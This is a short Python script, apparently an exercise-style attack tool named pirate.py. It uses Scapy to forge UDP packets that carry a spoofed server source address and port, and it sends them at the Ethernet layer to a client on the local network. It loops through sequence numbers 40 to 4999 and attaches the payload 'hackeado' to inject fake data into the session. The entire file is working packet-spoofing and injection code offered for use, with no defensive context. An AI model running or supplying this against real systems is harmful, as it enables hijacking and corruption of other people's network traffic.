#!/usr/bin/python3
from scapy.all import IP, UDP, Ether, Raw, sendp, getmacbyip, conf
import sys

def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
    # Resolve the MAC address of the client machine
    client_mac = getmacbyip(client_ip)
    if client_mac is None:
        print(f"Could not resolve MAC address for {client_ip}. Is it in the same network?")
        sys.exit(1)

    print(f"Resolved {client_ip} to MAC {client_mac}")
    print(f"Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")

    # Create and send packets
    for seq_num in range(40, 5000):
        # Fake payload
        fake_packet_payload = seq_num.to_bytes(2, 'big') + b"hackeado"

        # Construct Ethernet frame with IP/UDP forged packet
        pirate_packet = Ether(dst=client_mac) / IP(src=server_ip, dst=client_ip) / \
                        UDP(sport=server_port, dport=client_port) / Raw(load=fake_packet_payload)

        # Send packet
        print(f"Injecting fake packet with sequence number {seq_num}")
        sendp(pirate_packet, iface=conf.iface)  # Sends the packet at Layer 2

if len(sys.argv) != 5:
    print("Usage: ./pirate.py <server_host> <server_port> <client_ip> <client_port>")
    sys.exit(1)

server_ip = sys.argv[1]
server_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

inject_pirate_packets(server_ip, server_port, client_ip, client_port)